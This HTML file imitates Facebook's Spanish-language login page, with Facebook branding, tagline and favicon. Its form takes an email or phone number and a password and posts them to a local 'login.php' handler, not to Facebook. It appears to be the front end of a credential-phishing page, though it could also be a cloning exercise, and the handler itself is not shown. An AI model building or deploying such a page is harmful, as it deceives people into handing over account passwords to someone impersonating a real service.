<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	 <script src="https://kit.fontawesome.com/888fece5f0.js" crossorigin="anonymous"></script>
	<link rel="shortcut icon"  href="https://cdn.icon-icons.com/icons2/2108/PNG/512/facebook_icon_130940.png">

	<link rel="stylesheet" href="assets/style.css">
	<title>Facebook - Entrar o Registrarse</title>
</head>
<body>

	<div class="container-login">

		<div class="title-facebook">
			<h1>facebook</h1>
			<h2>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</h2>
		</div>
		<div>
			<form action="login.php" method="post">
				
				<div class="user">
					
					<input type="text" required name="user" id="user" placeholder="Correo electrónico o número de teléfono">
				</div>
				<div class="password">
					<input type="password" required name="password" id="password" placeholder="Contraseña">
				</div>


				<div class="btn-send">
					<input  type="submit" name="send" id="send" value="Iniciar Sesión">
				</div>

				<div class="pass">
					<a href="#">¿Olvidaste tu contraseña?</a>
				</div>
				
				<div class="new">
					<a href="#">Crear cuenta nueva</a>
				</div>

				
			</form>
			<div class="title-footer">
				<p style="color: transparent !important;"><span class="font">Crea una página</span> para un famoso, una marca o una empresa.</p>
			</div>
		</div>

	</div>
	
</body>
</html>